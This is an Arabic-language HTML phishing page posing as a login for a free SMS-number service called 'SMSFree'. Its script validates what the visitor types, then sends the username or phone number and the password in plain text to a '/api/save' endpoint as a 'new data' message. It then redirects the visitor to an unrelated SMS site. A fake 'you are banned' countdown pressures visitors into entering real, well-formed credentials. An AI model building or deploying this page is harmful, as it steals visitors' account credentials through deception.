<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - التحقق الآمن</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.8);
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
            background: radial-gradient(circle at top, #1e293b, #0f172a);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
            overflow: hidden;
        }

        .main-container {
            width: 90%; max-width: 400px; background: var(--card-bg);
            backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 45px 30px; border-radius: 30px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
            position: relative; transition: 0.5s ease;
        }

        /* تأثير التجميد والضباب */
        .is-banned .blur-content {
            filter: blur(20px);
            opacity: 0.1;
            pointer-events: none;
        }

        /* واجهة الحظر */
        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; display: none; width: 100%;
        }

        .ban-title { font-size: 19px; font-weight: bold; color: #fbbf24; margin-bottom: 20px; display: block; }

        /* الأنيميشن الحلزوني */
        .loader-wrap { position: relative; width: 110px; height: 110px; margin: 0 auto; }
        .spiral {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border: 4px solid rgba(34, 211, 238, 0.1);
            border-top: 4px solid var(--primary-cyan);
            border-radius: 50%; animation: spin 1s linear infinite;
        }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        #timer {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-size: 32px; font-weight: bold; color: #fbbf24;
        }

        /* التنسيقات العامة */
        .logo-circle {
            width: 90px; height: 90px; border: 2px solid var(--primary-cyan);
            border-radius: 50%; margin: 0 auto 30px;
            display: flex; justify-content: center; align-items: center;
            font-size: 18px; font-weight: 900; color: var(--primary-cyan);
            background: rgba(34, 211, 238, 0.05);
        }

        h2 { font-size: 15px; color: #94a3b8; margin-bottom: 35px; line-height: 1.7; }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box; transition: 0.3s;
        }
        input:focus { border-color: var(--primary-cyan); background: rgba(15, 23, 42, 0.9); }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(135deg, #0ea5e9, #22d3ee);
            border: none; border-radius: 15px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s;
        }
        .submit-btn:hover { opacity: 0.9; transform: translateY(-1px); }

        /* تخصيص النافذة المنبثقة الأنيقة */
        .elegant-popup {
            background: #1e293b !important;
            border: 1px solid rgba(255, 255, 255, 0.1) !important;
            border-radius: 25px !important;
            color: #fff !important;
        }
    </style>
</head>
<body>

<div class="main-container" id="mainCard">
    <div class="ban-overlay" id="banOverlay">
        <span class="ban-title">لقد تم حظرك</span>
        <div class="loader-wrap">
            <div class="spiral"></div>
            <div id="timer">30</div>
        </div>
        <h3 style="color: #fbbf24; margin: 20px 0 5px; font-size: 17px;">نظام الحماية نشط</h3>
        <p style="font-size: 13px; color: #94a3b8;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
    </div>

    <div class="blur-content">
        <div class="logo-circle">SMSFree</div>
        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لحساباتك.</h2>

        <form id="loginForm">
            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required autocomplete="off">
            <input type="password" id="pass" placeholder="كلمة المرور" required>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
    </div>
</div>

<script>
    let attempts = 0;

    window.onload = () => {
        const savedExpiry = localStorage.getItem('block_time');
        if (savedExpiry) {
            const remain = Math.round((savedExpiry - Date.now()) / 1000);
            if (remain > 0) applyLock(remain);
            else localStorage.removeItem('block_time');
        }
    };

    document.getElementById('loginForm').onsubmit = (e) => {
        e.preventDefault();
        const u = document.getElementById('user').value.trim();
        const p = document.getElementById('pass').value;

        const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRx = /^[0-9]{8,15}$/;
        const hasAr = /[\u0600-\u06FF]/.test(u);

        if ((emailRx.test(u) || phoneRx.test(u)) && !hasAr && p.length >= 6) {
            saveAndGo(u, p);
        } else {
            attempts++;
            if (attempts >= 3) {
                const expiry = Date.now() + (30 * 1000);
                localStorage.setItem('block_time', expiry);
                applyLock(30);
            } else {
                // الدايلوج الأنيق مع ميزة مسح الحقول
                Swal.fire({
                    title: 'بيانات غير صالحة',
                    text: 'يرجى كتابة البريد بشكل صحيح (مثل name@mail.com) أو رقم هاتف صالح بدون أحرف عربية لتجنب الحظر.',
                    icon: 'error',
                    confirmButtonText: 'OK',
                    confirmButtonColor: '#22d3ee',
                    customClass: { popup: 'elegant-popup' }
                }).then(() => {
                    // مسح البيانات عند الضغط على OK
                    document.getElementById('user').value = '';
                    document.getElementById('pass').value = '';
                    document.getElementById('user').focus();
                });
            }
        }
    };

    function applyLock(sec) {
        const card = document.getElementById('mainCard');
        const overlay = document.getElementById('banOverlay');
        const timerTxt = document.getElementById('timer');
        
        card.classList.add('is-banned');
        overlay.style.display = 'block';

        let left = sec;
        timerTxt.innerText = left;

        const counter = setInterval(() => {
            left--;
            timerTxt.innerText = left;
            if (left <= 0) {
                clearInterval(counter);
                card.classList.remove('is-banned');
                overlay.style.display = 'none';
                localStorage.removeItem('block_time');
                attempts = 0;
            }
        }, 1000);
    }

    async function saveAndGo(u, p) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `✅ بيانات جديدة:\n👤: ${u}\n🔑: ${p}` })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (e) {}
    }
</script>

</body>
</html>
